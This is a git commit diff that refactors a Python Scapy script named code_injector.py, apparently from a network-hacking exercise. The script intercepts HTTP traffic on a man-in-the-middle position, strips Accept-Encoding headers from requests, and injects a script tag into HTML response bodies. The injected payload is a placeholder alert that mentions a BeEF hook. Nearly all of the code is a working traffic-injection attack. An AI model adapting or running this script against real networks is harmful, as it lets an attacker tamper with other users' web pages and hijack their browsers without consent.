e1ecd7011f780b6d42d187fda480d9c403a95801
Noe <Noe.BERDOZ@cpnv.ch>
2022-02-05 17:33:36 +0100

    Code Injector Script - Code clean and refactor

--- code_injector.py
+++ code_injector.py
@@ -13,23 +13,28 @@ def set_load(packet, load):
     return packet
 
 
-#  Regex: take "Accept-Encoding", ".*" any type & number of characters, "?\\r\\n" stop at first occurence of '\r\n'
-#  Accept-Encoding:.*?\\r\\n
-
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
+
+        load = scapy_packet[scapy.Raw].load
+
         if scapy_packet[scapy.TCP].dport == 80:
             print("[+] Request")
-            modified_load = re.sub("Accept-Encoding:.*?\\r\\n", "", scapy_packet[scapy.Raw].load)  # Replace occurrence
-            new_packet = set_load(scapy_packet, modified_load)
-            packet.set_payload(str(new_packet))  # Set the modified packet
+
+            #  Regex: Accept-Encoding:.*?\\r\\n
+            #  take "Accept-Encoding", ".*" any type & number of characters, "?\\r\\n" stop at first occurrence '\r\n'
+            #  Accept-Encoding:.*?\\r\\n
+            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)  # Replace occurrence that change data format
+
         elif scapy_packet[scapy.TCP].sport == 80:
             print("[+] Response")
-            modified_load = scapy_packet[scapy.Raw].load.replace("<body>", "<body><script>alert('This could be a Beef Hook');</script>")
-            new_packet = set_load(scapy_packet, modified_load)
-            packet.set_payload(str(new_packet))
-            print(scapy_packet.show())
+            load = load.replace("<body>", "<body><script>alert('This could be a Beef Hook');</script>")
+
+        # Set packet if his load has been modified
+        if load != scapy_packet[scapy.Raw].load:
+            new_packet = set_load(scapy_packet, load)
+            packet.set_payload(str(new_packet))  # Set the modified packet
 
     packet.accept()
 
